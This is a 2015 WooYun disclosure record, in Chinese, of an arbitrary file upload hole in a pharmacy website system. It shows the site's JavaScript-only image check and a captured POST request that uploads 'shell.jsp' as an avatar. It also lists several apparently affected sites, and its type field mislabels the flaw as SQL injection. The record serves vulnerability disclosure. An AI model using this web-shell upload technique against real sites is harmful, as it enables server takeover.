{"id": 35296, "wybug_id": "wooyun-2015-0104283", "wybug_title": "某通用型药店系统存在任意文件上传漏洞", "wybug_corp": "杭州珍诚网络科技有限公司", "wybug_author": "路人甲", "wybug_date": "2015-03-30 12:50", "wybug_open_date": "2015-07-02 14:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "13", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-06：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-02：\t细节向公众公开  简要描述： 杭州珍诚网络科技有限公司开发的大药房系统存在任意文件上传漏洞 详细说明：  厂商：\n杭州珍诚网络科技有限公司  http://www.zc511.com/showIndex.do\n\nhttp://www.ewj2009.com/http://www.nbzyyy.com/http://wzyst.net/http://www.yizheng.cc/http://www.zjrrt.com/\nUpload Bug:\n注册用户后登陆修改基本资料的头像上传处仅仅在本地进行了Javascrip校验，服务端没有校验文件上传的类型。注册会员---登录——基本资料修改——上传JPG头像——抓包修改为JSP——任意文件被上传<script>function uploadImg(value){\tdocument.getElementById('textfield').value=value;\ttestviewpic(\"showImg\",\"textfield\");}\tfunction testviewpic(m,im) \t\t{ \t\tvar mypic = document.getElementById(m);\t\tvar imgfilepath = document.getElementById(im)\t\tvar oldSrc = mypic.src;\t\t var myflag=0; //进行筛选的图片的扩展名 \t\t var aa = \".gif|.jpg|.jpeg|.bmp|.png\"; //分离出可以通过的图片扩展名\t\t var bb = aa.split('|'); //进行循环判断，路经是否为图片 \t\t for(var i=0;i<bb.length;i++)\t\t { \t\t  //检索路径是否含有指定图片的扩展名\t\t  var cc = imgfilepath.value.toLowerCase().indexOf(bb[i]); \t\t  if (cc > 0)\t\t  {\t\t   //当图片的路经中含有指定的扩展名时，对状态进行赋值 \t\t   myflag=1; mypic.src=imgfilepath.value; mypic.style.display=\"\"; mypic.border=1; break; \t\t  } \t\t } \t\t //如果状态为错误，弹出信息框 \t\t if(myflag == 0) \t\t { \t\t  alert(\"请选择图片文件\"); //清除上传框的路径值 \t\t  imgfilepath.outerHTML = imgfilepath.outerHTML; imgfilepath.value=\"\"; mypic.src=oldSrc;  \t\t  document.getElementById(\"theFile\").value=\"\";\t\t } \t} \tfunction fclick(){\t\t$(\"#theFile\").click();\t}</script>\nUpload POST:\nPOST /updateUserInfo.do HTTP/1.1Host: www.****.cnProxy-Connection: keep-aliveContent-Length: 6111Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://www.****.cnUser-Agent: ************Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYVYCBNAmsZCHFNFRReferer: http://www.*****.cn/getUserInfo.doAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: *********------WebKitFormBoundaryYVYCBNAmsZCHFNFRContent-Disposition: form-data; name=\"textfield\"C:\\fakepath\\shell.jpg------WebKitFormBoundaryYVYCBNAmsZCHFNFRContent-Disposition: form-data; name=\"theFile\"; filename=\"shell.jsp\"  //这里的类型可被随意控制Content-Type: image/jpegshellcode------WebKitFormBoundaryYVYCBNAmsZCHFNFRContent-Disposition: form-data; name=\"userName\"test------WebKitFormBoundaryYVYCBNAmsZCHFNFRContent-Disposition: form-data; name=\"userNickName\"test------WebKitFormBoundaryYVYCBNAmsZCHFNFRContent-Disposition: form-data; name=\"userAddress\"------WebKitFormBoundaryYVYCBNAmsZCHFNFRContent-Disposition: form-data; name=\"postCode\"------WebKitFormBoundaryYVYCBNAmsZCHFNFRContent-Disposition: form-data; name=\"mobile\"------WebKitFormBoundaryYVYCBNAmsZCHFNFRContent-Disposition: form-data; name=\"phone\"------WebKitFormBoundaryYVYCBNAmsZCHFNFR--\n   漏洞证明：  以其中一个案例进行测试：\n1、\n\n提示更新成功后查看头像地址：\n\n\n\n\n\n\n\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-04-03 14:39 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给浙江分中心，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}